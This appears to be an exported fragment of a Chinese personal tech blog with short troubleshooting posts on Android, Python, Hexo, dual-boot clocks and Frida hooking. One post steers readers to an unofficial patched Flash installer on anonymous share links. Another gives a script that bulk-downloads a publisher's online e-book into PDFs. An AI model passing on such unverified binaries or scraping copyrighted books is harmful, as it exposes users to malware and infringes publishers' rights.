<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">16384         0x4000          PC bitmap, Windows 3.x format,, 1080 x 1920 x 24</span><br><span class="line">6237238       0x5F2C36        PC bitmap, Windows 3.x format,, 1080 x 1920 x 24</span><br><span class="line">12458092      0xBE186C        PC bitmap, Windows 3.x format,, 1080 x 1920 x 24</span><br><span class="line">18678946      0x11D04A2       PC bitmap, Windows 3.x format,, 1080 x 1920 x 24</span><br></pre></td></tr></table></figure>
<p>然后使用dd命令或十六进制编辑器，提取BMP图片即可。</p>
<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>2040x1080：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/miui-fastboot.png"><br>1920x1080：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/miui-fastboot-1920-1080.bmp"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://forum.xda-developers.com/t/guide-how-to-change-boot-logo-splash-screen-for-snapdragon-devices-splash-img.3470473/">[GUIDE] How to Change Boot Logo (Splash Screen) for Snapdragon Devices (splash.img)</a><br><a href="https://forum.xda-developers.com/t/changing-boot-logo-logo-bin-program.1953726/">Changing boot logo (logo.bin) program</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>VS Code修复pylint报错E1101</title>
    <url>/2018/12/18/fix-VSCODE-E1101-Error/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>使用pygame开发游戏（完成作业时），VS Code总是在pygame处报E1101错误，刚开始设置的<code>python.linting.mypyArgs</code>毫无用处</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;python.linting.mypyArgs&quot;</span>: [<span class="string">&quot;--disable=E1101&quot;</span>,]</span><br></pre></td></tr></table></figure>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>继续谷歌一下，找到<a href="https://www.jianshu.com/p/ab72e830b2a9">vs code中pylint报错E1101问题的解决</a><br>于是设置<code>python.linting.pylintArgs</code>参数，值为”–generate-members”，总算解决了这个问题</p>
<h2 id="修改settings-json代码"><a href="#修改settings-json代码" class="headerlink" title="修改settings.json代码"></a>修改settings.json代码</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;python.linting.pylintArgs&quot;</span>: [<span class="string">&quot;--generate-members&quot;</span>,],</span><br></pre></td></tr></table></figure>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote>
<p>函数或值是动态被设置的，而pylint的推断系统里没有该值，因此触发了E1101报错。可以通过配置 generate-members 参数来避免此类报错。</p>
</blockquote>
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>修复安卓Log日志不输出问题</title>
    <url>/2022/05/03/fix-android-logd-crash/</url>
    <content><![CDATA[<h2 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h2><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logcat: Unexpected EOF!</span><br><span class="line"></span><br><span class="line">This means that either the device shut down, logd crashed, or this instance of logcat was unable to read log</span><br><span class="line">messages as quickly as they were being produced.</span><br></pre></td></tr></table></figure>
<h3 id="LSPosed"><a href="#LSPosed" class="headerlink" title="LSPosed"></a>LSPosed</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Logd maybe crashed, retrying in 1s...</span><br><span class="line">Logd crashed too many times, trying manually start...</span><br></pre></td></tr></table></figure>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><code>开发者选项</code>-<code>日志记录器缓冲区大小</code>修改为<code>16M</code>。</p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>修复crypto模块import失败（Python2）</title>
    <url>/2019/01/26/fix-crypto-py2/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>使用Python2.7安装好pycrypto模块后，还是报错，搜索得到解决方案</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>打开Python2.7安装目录，找到<code>Lib/site-package/crypto</code>文件夹<br>重命名为Crypto即可</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/fawaikuangtu123/p/9761943.html">解释Crypto模块怎么就这么”皮”？No module named “Crypto”</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>迁移Hexo到Node.js 14 解决部署时报错</title>
    <url>/2021/08/01/fix-hexo-node-mismatch/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>重装系统之后，安装了高版本的Node.js，部署时报错，于是搜索之，发现原因是hexo版本不适配，一番尝试后解决。</p>
<p>思路为：新建一个hexo项目，使用其配置文件，并手动安装缺失依赖。</p>
<p>PS：降级肯定是可以解决的，不过不够优雅（强迫症）。</p>
<span id="more"></span>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Node.js <code>14.17.4</code>, Hexo-cli <code>4.3.0</code>, Hexo <code>5.4.0</code></p>
<h2 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The &quot;mode&quot; argument must be integer. Received an instance of Object</span><br></pre></td></tr></table></figure>
<h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>在另一个位置初始化hexo项目（实际上是克隆<code>https://github.com/hexojs/hexo-starter.git</code>）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
<p>打开<code>package.json</code>，查看默认配置（使用时，可删除主题依赖<code>hexo-theme-landscape</code>）</p>
<h3 id="默认配置"><a href="#默认配置" class="headerlink" title="默认配置"></a>默认配置</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;hexo-site&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;private&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;build&quot;</span>: <span class="string">&quot;hexo generate&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;clean&quot;</span>: <span class="string">&quot;hexo clean&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;deploy&quot;</span>: <span class="string">&quot;hexo deploy&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;server&quot;</span>: <span class="string">&quot;hexo server&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;hexo&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;hexo&quot;</span>: <span class="string">&quot;^5.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hexo-generator-archive&quot;</span>: <span class="string">&quot;^1.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hexo-generator-category&quot;</span>: <span class="string">&quot;^1.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hexo-generator-index&quot;</span>: <span class="string">&quot;^2.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hexo-generator-tag&quot;</span>: <span class="string">&quot;^1.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hexo-renderer-ejs&quot;</span>: <span class="string">&quot;^1.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hexo-renderer-marked&quot;</span>: <span class="string">&quot;^4.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hexo-renderer-stylus&quot;</span>: <span class="string">&quot;^2.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hexo-server&quot;</span>: <span class="string">&quot;^2.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hexo-theme-landscape&quot;</span>: <span class="string">&quot;^0.0.3&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="安装缺失依赖"><a href="#安装缺失依赖" class="headerlink" title="安装缺失依赖"></a>安装缺失依赖</h3><p>与之前的<code>package.json</code>对比，发现缺少<code>hexo-generator-json-content</code>和<code>hexo-deployer-git</code>依赖。<br>于是将<code>package.json</code>拷贝回去，覆盖旧版文件，删除<code>node_modules</code>文件夹后，手动安装依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i hexo-generator-json-content --save</span><br><span class="line">npm i hexo-deployer-git --save</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<h3 id="本地生成及查看"><a href="#本地生成及查看" class="headerlink" title="本地生成及查看"></a>本地生成及查看</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<h3 id="配置文件修改"><a href="#配置文件修改" class="headerlink" title="配置文件修改"></a>配置文件修改</h3><p>报错如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WARN  Deprecated config detected: &quot;external_link&quot; with a Boolean value is deprecated. See https://hexo.io/docs/configuration for more details.</span><br></pre></td></tr></table></figure>
<p>将配置项修改为：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>PS：部署到git建议使用ssh协议</p>
<h3 id="部署偶尔提示Warning"><a href="#部署偶尔提示Warning" class="headerlink" title="部署偶尔提示Warning"></a>部署偶尔提示Warning</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: Accessing non-existent property ‘lineno’ of module exports inside circular dependency</span><br></pre></td></tr></table></figure>
<h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p><code>nib:1.1.2</code>使用的是旧版<code>stylus:0.54.5</code></p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>在博客项目的<code>package.json</code>中添加（记得加逗号）：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;resolutions&quot;</span>: &#123;</span><br><span class="line">  <span class="attr">&quot;stylus&quot;</span>: <span class="string">&quot;^0.54.8&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新安装<code>stylus</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yarn remove hexo-renderer-stylus</span><br><span class="line">yarn add hexo-renderer-stylus</span><br></pre></td></tr></table></figure>

<p>然后执行<code>yarn install</code> </p>
<p>PS：<code>yarn</code>需要手动安装</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.haoyizebo.com/posts/710984d0/">解决 Hexo 在使用 Node.js 14 时的 Accessing non-existent property ‘xxx’ of module exports inside circular dependency 问题</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>修复Flash插件提示地区不符的问题</title>
    <url>/2019/01/26/fix-flash/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Adobe Flash Player 从 30 版本开始，中国大陆地区用户只能使用特供版<br>后台存在广告服务、弹出广告窗口、捆绑流氓软件的行为。<br>由于有的网站只能用flash，而安装国际版flash又提示地区不符，所以需要找个办法解决。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="安装直装版（由roustar31制作）"><a href="#安装直装版（由roustar31制作）" class="headerlink" title="安装直装版（由roustar31制作）"></a>安装直装版（由roustar31制作）</h3><p>运行程序后，会卸载原版flash再自动安装。</p>
<blockquote>
<p>IE浏览器使用AX版本<br>Chrome系浏览器及QQ使用PPAPI版本<br>Firefox或其他使用NPAPI版本</p>
</blockquote>
<p>PS：若安装后仍无效，请使用压缩包中的文件替换系统及浏览器的<code>pepflashplayer.dll</code>（具体路径自行搜索）</p>
<h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><h4 id="直装版"><a href="#直装版" class="headerlink" title="直装版"></a>直装版</h4><p><a href="https://lanzous.com/b00e2zxej">https://lanzous.com/b00e2zxej</a><br>密码:gz09</p>
<h4 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h4><p><a href="https://lanzous.com/b00dx336j">https://lanzous.com/b00dx336j</a><br>密码:f0ph</p>
<h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p><a href="https://www.repaik.com/forum.php?mod=viewthread&tid=340482">Adobe Flash Player AX/NP/PP 特别版</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>修复双系统（Win+Linux）时间不同步问题</title>
    <url>/2019/02/16/fix-linux-time/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>笔记本装了win10+Ubuntu18.04双系统，但是两个系统的时间并不同步，相差8小时（正好是时区数）。于是搜索之，找到解决方案</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>Windows 与 Mac/Linux 看待系统硬件时间（Hardware Ttime，或称实时时间，即RTC，Real_Time Clock）的方式不同。<br>Windows把计算机硬件时间当作本地时间(local time)，所以在Windows系统中显示的时间跟BIOS中显示的时间是一样的。<br>而Linux/Unix/Mac把计算机硬件时间当作UTC（Universal Time Coordinated，世界统一时间）， 所以在Linux/Unix/Mac系统启动后在该时间的基础上，加上电脑设置的时区数。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>所以只需要使两个系统对待硬件时间的方式一致即可。<br>自然，有两种方法。</p>
<h3 id="方法1-修改Linux系统"><a href="#方法1-修改Linux系统" class="headerlink" title="方法1 修改Linux系统"></a>方法1 修改Linux系统</h3><p>打开终端，执行<br><code>timedatectl set-local-rtc 1</code><br>禁用Linux系统的UTC时间，重启即可生效（不需要管理员权限）</p>
<blockquote>
<p>提示： 在 Ubuntu 16.04 版本以前，关闭UTC的方法是编辑/etc/default/rcS，将UTC=yes改成UTC=no， 但在Ubuntu 16.04使用systemd启动之后，时间改成了由timedatectl来管理</p>
</blockquote>
<p>如果时间还是不对，就先在设置里修改系统时间为当前时间（北京时间），然后执行<br><code>timedatectl set-local-rtc 1</code><br>再<br><code>sudo hwclock -w</code><br>写入当前时间到硬件</p>
<h3 id="方法2-修改Windows系统（不建议）"><a href="#方法2-修改Windows系统（不建议）" class="headerlink" title="方法2 修改Windows系统（不建议）"></a>方法2 修改Windows系统（不建议）</h3><p>Win+X，打开<code>Powershell</code>（管理员），执行<br><code>Reg add HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 1</code><br>解释：设置<code>RealTimeIsUniversal</code>键值为1，也就是把RTC当作UTC<br>然而我用这种方法，切换几次系统以后时间往后推了16小时= =<br>所以个人不推荐使用这种方法</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/zyqblog/article/details/79318955?utm_source=copy">解决Windows10与Ubuntu16.04双系统时间不一样问题！</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>FlipViewer Xpress在线文档转pdf</title>
    <url>/2020/04/07/flipviewer-xpress-to-pdf/</url>
    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>python环境（已安装requests）</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="获取源地址"><a href="#获取源地址" class="headerlink" title="获取源地址"></a>获取源地址</h3><p>首先F12-Network，然后刷新一下页面。获取到当前文档页面的源地址，类似于<br><code>http://ebooks.crup.com.cn/t/xxxxx_output/web/xxxxx_opf_files/xxxxxxxxxxxxxxxxxxxx_1.swf</code><br>下划线后的数字对应页码。</p>
<h3 id="安装程序包"><a href="#安装程序包" class="headerlink" title="安装程序包"></a>安装程序包</h3><p>需要安装requests用于请求文件，安装pillow用于合并pdf：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install requests pillow</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@Author: Xhy</span></span><br><span class="line"><span class="string">@Fix: kelffon wang</span></span><br><span class="line"><span class="string">@Description: SWF2PDF</span></span><br><span class="line"><span class="string">@LastEditTime: 2020-04-16 23:51:36</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># By Xhy</span></span><br><span class="line">urlStart = <span class="string">&quot;http://ebooks.crup.com.cn/t/xxxxx_output/web/xxxxx_opf_files/xxxxxxxxxxxxxxxxxxxx_&quot;</span></span><br><span class="line">startPage = <span class="number">1</span></span><br><span class="line">endPage = <span class="number">361</span></span><br><span class="line">minDepartPage = <span class="number">120</span></span><br><span class="line">departPage = <span class="number">60</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPic</span>(<span class="params">i</span>):</span></span><br><span class="line">    url = urlStart + <span class="built_in">str</span>(i) + <span class="string">&quot;.swf&quot;</span></span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span>(res.status_code == <span class="number">200</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27;.swf&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(res.content)</span><br><span class="line">            <span class="built_in">print</span>(i, <span class="string">&quot;Swf Saved&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.status_code, <span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mergePng2Pdf</span>(<span class="params">s, e</span>):</span></span><br><span class="line">    imgs = []</span><br><span class="line">    first_img = Image.<span class="built_in">open</span>(<span class="built_in">str</span>(s)+<span class="string">&quot;.png&quot;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s+<span class="number">1</span>, e):</span><br><span class="line">        imgs.append(Image.<span class="built_in">open</span>(<span class="built_in">str</span>(i)+<span class="string">&quot;.png&quot;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>))</span><br><span class="line">    first_img.save(<span class="string">&#x27;book_&#x27;</span>+<span class="built_in">str</span>(s)+<span class="string">&#x27;.pdf&#x27;</span>, <span class="string">&#x27;PDF&#x27;</span>, resolution=<span class="number">100.0</span>,</span><br><span class="line">                   save_all=<span class="literal">True</span>, append_images=imgs)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PDF Saved.&quot;</span>,<span class="string">&#x27;location: book_&#x27;</span>+<span class="built_in">str</span>(s)+<span class="string">&#x27;.pdf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_download</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startPage, endPage+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.access(<span class="built_in">str</span>(i)+<span class="string">&quot;.png&quot;</span>, os.F_OK) <span class="keyword">and</span> <span class="keyword">not</span> os.access(<span class="built_in">str</span>(i)+<span class="string">&quot;.swf&quot;</span>, os.F_OK)):</span><br><span class="line">            getPic(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_convert</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startPage, endPage+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(os.access(<span class="built_in">str</span>(i)+<span class="string">&quot;.swf&quot;</span>, os.F_OK) <span class="keyword">and</span> <span class="keyword">not</span> os.access(<span class="built_in">str</span>(i)+<span class="string">&quot;.png&quot;</span>, os.F_OK)):</span><br><span class="line">            execstr = <span class="string">&quot;swfrender.exe &quot;</span> + \</span><br><span class="line">                <span class="built_in">str</span>(i)+<span class="string">&quot;.swf -X 3200 -Y 4800 -o &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.png&quot;</span></span><br><span class="line">            val = os.system(execstr)</span><br><span class="line">            <span class="keyword">if</span>(val == <span class="number">0</span>):</span><br><span class="line">                <span class="built_in">print</span>(i, <span class="string">&quot;Png Saved.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_merge</span>():</span></span><br><span class="line">    <span class="keyword">if</span> (endPage-startPage) &lt; minDepartPage:</span><br><span class="line">        mergePng2Pdf(startPage, endPage)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        depart = <span class="built_in">int</span>((endPage-startPage)/departPage)+<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(depart):</span><br><span class="line">            s = startPage+i*departPage</span><br><span class="line">            t = s+departPage</span><br><span class="line">            pdfname = <span class="string">&#x27;book_&#x27;</span>+<span class="built_in">str</span>(s)+<span class="string">&#x27;.pdf&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">not</span> os.access(pdfname, os.F_OK)):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;PDF&quot;</span>, i+<span class="number">1</span>, <span class="string">&quot;building...&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span>(s &gt; endPage):</span><br><span class="line">                    s = endPage</span><br><span class="line">                <span class="keyword">if</span>(t &gt; endPage):</span><br><span class="line">                    t = endPage</span><br><span class="line">                mergePng2Pdf(s, t)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;PDF&quot;</span>, i+<span class="number">1</span>, <span class="string">&quot;existed!&quot;</span>)</span><br><span class="line"></span><br><span class="line">do_download()</span><br><span class="line">do_convert()</span><br><span class="line">do_merge()</span><br></pre></td></tr></table></figure>
<p>使用时需替换开头的三个参数为具体值(默认配置为超过120页启动自动分页功能，每60页保存为1个pdf文件)<br>执行此脚本即可完成 下载-转换-合并pdf 操作</p>
<h2 id="打包程序下载地址（包含脚本及swfrender-exe"><a href="#打包程序下载地址（包含脚本及swfrender-exe" class="headerlink" title="打包程序下载地址（包含脚本及swfrender.exe)"></a>打包程序下载地址（包含脚本及swfrender.exe)</h2><p> <a href="https://pan.baidu.com/s/13YWWebNCQU2DzuPibCnKUg">https://pan.baidu.com/s/13YWWebNCQU2DzuPibCnKUg</a> 提取码: 2333<br>解压后，根据具体情况修改脚本，执行download.bat即可（需要先安装requests和pillow）</p>
<p>PS：多个pdf合并可以使用<a href="https://www.52pojie.cn/thread-1082693-1-1.html">uPDF</a><br>uPDF下载地址：<br><a href="https://www.lanzous.com/b00te5znc">蓝奏云</a> 密码:gnsr （仅含非ocr版）</p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida Hook匿名内部类</title>
    <url>/2021/10/13/frida-hook-anonymous-class/</url>
    <content><![CDATA[<h2 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h2><h3 id="创建方式"><a href="#创建方式" class="headerlink" title="创建方式"></a>创建方式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> 父类构造器（参数列表）| 实现接口（）  </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//匿名内部类的类体部分</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="查看编译后类名"><a href="#查看编译后类名" class="headerlink" title="查看编译后类名"></a>查看编译后类名</h3><p>反编译dex，查看smali代码（也可使用Frida枚举已加载的类，打印其父类名和接口名，进行比对）</p>
<span id="more"></span>
<h3 id="编译结果"><a href="#编译结果" class="headerlink" title="编译结果"></a>编译结果</h3><p><code>Java</code>：<code>MainActivity$1</code><br><code>Kotlin</code>：<code>MainActivity$ExternalSyntheticLambda0</code></p>
<h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><p><code>Frida</code>Hook内部类名即可，如<code>MainActivity$1</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/chenssy/p/3390871.html">java提高篇(十)—–详解匿名内部类</a><br><a href="https://kevinspider.github.io/fridahookjava/">frida hook java</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>gcc编译Python模块失败(找不到Python.h)</title>
    <url>/2018/12/07/fix-python-h/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>服务器恢复快照以后，一大堆东西都要重新安装。<br>安装PyCrypto时发生错误，提示<br><code>Python.h: No such file or directory</code><br>于是 首先执行 <code>yum upgrade</code>，升级下试试<br>然而还是编译错误，所以肯定是没有安装依赖</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>查了一下是没安装开发环境（然而之前好像是可以直接编译的。。）<br>而<code>python-devel</code>已安装，然而搜不到<code>python3-devel</code><br>于是搜索<code>python3</code>,找到了<code>python36u-devel</code><br><code>yum install python36u-devel</code><br>安装后编译成功</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/u013414502/article/details/79531509">Centos7 “fatal error: Python.h: No such file or directory “commmand ‘gcc’ failed with exit status 1</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>修复 AOSP QSEECOMD 错误日志</title>
    <url>/2019/11/20/fix_error_log_qseecomd_aosp/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>刷入自己编译的AOSP系统，一直有日志输出，TAG为<code>QSEECOMD</code>，日志内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11-20 17:34:14.924 30350-30350/? D/QSEECOMD:: qseecom listener services process entry PPID = 1</span><br><span class="line">11-20 17:34:14.924 30350-30350/? E/QSEECOMD:: Listener: index = 0, hierarchy = 0</span><br><span class="line">11-20 17:34:14.925 30350-30350/? E/QSEECOMD:: Init dlopen(librpmb.so, RLTD_NOW) is failed....</span><br><span class="line">11-20 17:34:14.925 30350-30350/? E/QSEECOMD:: ERROR: RPMB_INIT failed, shall not start listener services</span><br></pre></td></tr></table></figure>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>百度得知是<code>librpmb.so</code>以及<code>libssd.so</code>文件缺失，到<a href="https://developers.google.com/android/images">官网</a>下载原版镜像（可根据系统代号查找）<br>提取出这两个文件，导入<code>/system/lib/</code>后重启即可（注意权限设置）<br>也可打包成magisk模块刷入（下载地址：<a href="https://pan.baidu.com/s/1AcnT-D9x8EE0Z6Jzuxgscw">https://pan.baidu.com/s/1AcnT-D9x8EE0Z6Jzuxgscw</a> 提取码: hqh5）<br>为了让下次编译系统时自动包含这两个文件，把它们复制到<code>out/target/product/hammerhead/system/lib/</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://ju.outofmemory.cn/entry/264142">How to solve QSEECOMD on AOSP</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida ts调试环境搭建（PyCharm）</title>
    <url>/2021/11/20/frida-script-debug-env-setup-pycharm/</url>
